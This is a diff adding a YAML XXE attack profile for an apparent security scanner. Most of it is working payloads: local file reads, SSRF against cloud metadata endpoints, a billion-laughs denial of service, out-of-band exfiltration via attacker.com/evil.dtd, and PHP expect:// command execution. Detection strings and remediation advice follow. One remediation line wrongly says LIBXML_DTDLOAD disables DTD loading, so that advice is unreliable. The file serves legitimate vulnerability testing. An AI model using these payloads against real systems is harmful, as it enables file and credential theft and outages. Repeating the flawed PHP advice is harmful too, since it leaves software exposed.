@@ -1,0 +1,290 @@
+# XXE (XML External Entity) Attack Profile
+# This file defines payloads for testing XXE vulnerabilities
+
+name: "XXE - XML External Entity"
+category: "injection"
+severity: "critical"
+description: "Tests for XML External Entity vulnerabilities that allow attackers to access local files, perform SSRF attacks, or cause denial of service through malicious XML input."
+
+# Fields commonly vulnerable to XXE attacks
+target_fields:
+  - "xml"
+  - "document"
+  - "data"
+  - "payload"
+  - "content"
+  - "body"
+  - "request"
+  - "input"
+  - "file"
+  - "upload"
+  - "import"
+  - "config"
+  - "xmldata"
+  - "soap"
+
+payloads:
+  # Basic file disclosure (Linux)
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <foo>&xxe;</foo>
+  
+  # Basic file disclosure with ELEMENT declaration
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ELEMENT foo ANY>
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <foo>&xxe;</foo>
+  
+  # Windows file disclosure
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">
+    ]>
+    <foo>&xxe;</foo>
+  
+  # Network share access (Windows)
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///\\attacker.com\share\test.txt">
+    ]>
+    <foo>&xxe;</foo>
+  
+  # SSRF - Internal network scanning
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://localhost:22">
+    ]>
+    <foo>&xxe;</foo>
+  
+  # SSRF - Cloud metadata (AWS)
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+    ]>
+    <foo>&xxe;</foo>
+  
+  # SSRF - Cloud metadata (GCP)
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
+    ]>
+    <foo>&xxe;</foo>
+  
+  # SSRF - Cloud metadata (Azure)
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance">
+    ]>
+    <foo>&xxe;</foo>
+  
+  # Billion Laughs Attack (DoS) - Use with caution!
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE lolz [
+      <!ENTITY lol "lol">
+      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+      <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+    ]>
+    <lolz>&lol4;</lolz>
+  
+  # Parameter entity injection
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+      %xxe;
+    ]>
+    <foo>test</foo>
+  
+  # OOB (Out-of-Band) data exfiltration
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY % file SYSTEM "file:///etc/passwd">
+      <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+      %dtd;
+    ]>
+    <foo>&send;</foo>
+  
+  # PHP filter wrapper (PHP applications)
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+    ]>
+    <foo>&xxe;</foo>
+  
+  # Expect wrapper (PHP - RCE)
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "expect://id">
+    ]>
+    <foo>&xxe;</foo>
+  
+  # UTF-7 encoded XXE (bypass filters)
+  - |
+    <?xml version="1.0" encoding="UTF-7"?>
+    +ADw-!DOCTYPE foo +AFs-
+      +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+    +AF0-+AD4-
+    +ADw-foo+AD4-+ACY-xxe+ADsAPA-/foo+AD4-
+  
+  # XInclude attack
+  - |
+    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+      <xi:include parse="text" href="file:///etc/passwd"/>
+    </foo>
+  
+  # SVG file upload XXE
+  - |
+    <?xml version="1.0" standalone="yes"?>
+    <!DOCTYPE svg [
+      <!ENTITY xxe SYSTEM "file:///etc/hostname">
+    ]>
+    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+      <text font-size="16" x="0" y="16">&xxe;</text>
+    </svg>
+  
+  # SOAP message XXE
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+        <foo>&xxe;</foo>
+      </soap:Body>
+    </soap:Envelope>
+
+# Indicators that suggest successful XXE exploitation
+success_indicators:
+  response_contains:
+    # Linux file content indicators
+    - "root:x:0:0"
+    - "/bin/bash"
+    - "/bin/sh"
+    - "daemon:x:"
+    - "nobody:x:"
+    # Windows file content indicators
+    - "[boot loader]"
+    - "[operating systems]"
+    - "for 16-bit app support"
+    # Error messages indicating XXE parsing
+    - "SYSTEM"
+    - "External Entity"
+    - "entity"
+    - "DOCTYPE"
+    - "DTD"
+    - "parser error"
+    - "XML parsing error"
+    - "SAXParseException"
+    - "XMLSyntaxError"
+    - "lxml.etree"
+    - "xml.etree.ElementTree"
+    - "SimpleXMLElement"
+    # Cloud metadata indicators
+    - "ami-id"
+    - "instance-id"
+    - "availabilityZone"
+    - "iam/security-credentials"
+    
+  status_codes:
+    - 500
+    - 503
+    
+  response_time_gt: 10  # seconds (for DoS detection)
+  
+  # Detects if response size is abnormally large (billion laughs)
+  response_size_gt: 1048576  # 1MB
+
+remediation: |
+  🔧 How to Prevent XXE Vulnerabilities:
+
+  1. **Disable DTD Processing**: The most effective defense is to disable DTD (Document Type Definition) processing entirely.
+  
+     ```python
+     # Python (defusedxml - RECOMMENDED)
+     import defusedxml.ElementTree as ET
+     tree = ET.parse(xml_file)  # Safe by default
+     
+     # Python (lxml)
+     from lxml import etree
+     parser = etree.XMLParser(resolve_entities=False, no_network=True)
+     tree = etree.parse(xml_file, parser)
+     ```
+  
+  2. **Disable External Entities** (Language-specific):
+  
+     ```java
+     // Java (DocumentBuilderFactory)
+     DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+     dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+     dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+     dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+     ```
+  
+     ```php
+     // PHP (PHP 8.0+: external entities disabled by default)
+     // For PHP < 8.0, guard the deprecated function
+     if (PHP_VERSION_ID < 80000 && function_exists('libxml_disable_entity_loader')) {
+         libxml_disable_entity_loader(true);
+     }
+     
+     // Use LIBXML_NONET only - blocks network fetches
+     // Do NOT use LIBXML_NOENT as it ENABLES entity substitution (unsafe!)
+     $xml = simplexml_load_string($input, 'SimpleXMLElement', LIBXML_NONET);
+     
+     // For stricter protection, also disable DTD loading
+     $xml = simplexml_load_string($input, 'SimpleXMLElement', LIBXML_NONET | LIBXML_DTDLOAD);
+     ```
+  
+     ```csharp
+     // .NET
+     XmlReaderSettings settings = new XmlReaderSettings();
+     settings.DtdProcessing = DtdProcessing.Prohibit;
+     settings.XmlResolver = null;
+     ```
+  
+  3. **Use Safe Libraries**:
+     - Python: `defusedxml` (drop-in replacement for standard xml libraries)
+     - Java: Configure `SAXParserFactory`, `XMLReader`, `DocumentBuilderFactory` properly
+     - Node.js: Use `libxmljs2` with proper configuration
+  
+  4. **Input Validation**:
+     - Reject XML input containing DOCTYPE declarations
+     - Validate XML against a strict schema (XSD)
+     - Whitelist expected XML structures
+  
+  5. **Server-side Protections**:
+     - Block outbound connections from XML parsers
+     - Use firewalls to restrict internal network access
+     - Disable network access for XML processing
+  
+  6. **File Upload Protections**:
+     - Validate and sanitize uploaded XML, SVG, DOCX, XLSX files
+     - Process uploads in sandboxed environments
+     - Re-encode/rewrite files after upload
+
+references:
+  - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+  - "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
+  - "https://portswigger.net/web-security/xxe"
+  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"
+  - "https://github.com/tkem/defusedxml"
+
+cat_message: "Meow! I found some tasty external entities in your XML! 📄🐱 (XXE vulnerability detected)"
